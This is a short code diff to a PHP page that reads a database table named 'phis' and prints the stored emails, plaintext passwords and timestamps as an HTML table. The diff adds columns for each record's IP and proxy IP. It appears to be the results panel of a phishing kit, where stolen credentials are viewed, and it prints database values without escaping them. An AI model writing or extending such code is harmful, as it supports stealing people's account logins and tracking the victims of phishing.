@@ -12,9 +12,9 @@
 		require_once('db-connection.php');
 		$query = "SELECT * FROM `phis`";
 		$result = $link->query($query);
-		echo "<table style='text-align:left' border='1'><tr><th>Email</th><th>Password</th><th>Time</th></tr>";
+		echo "<table style='text-align:left' border='1'><tr><th>Email</th><th>Password</th><th>Time</th><th>IP</th><th>Prox IP</th></tr>";
 		while($row  = $result->fetch_array(MYSQLI_ASSOC)){
-			echo "<tr><td>".$row['Email']."</td><td>".$row['Password']."</td><td>".$row['Time']."</td></tr>";
+			echo "<tr><td>".$row['Email']."</td><td>".$row['Password']."</td><td>".$row['Time']."</td><td>".$row['IP']."</td><td>".$row['proxIp']."</td></tr>";
 		}
 		echo "</table>";
 	?>
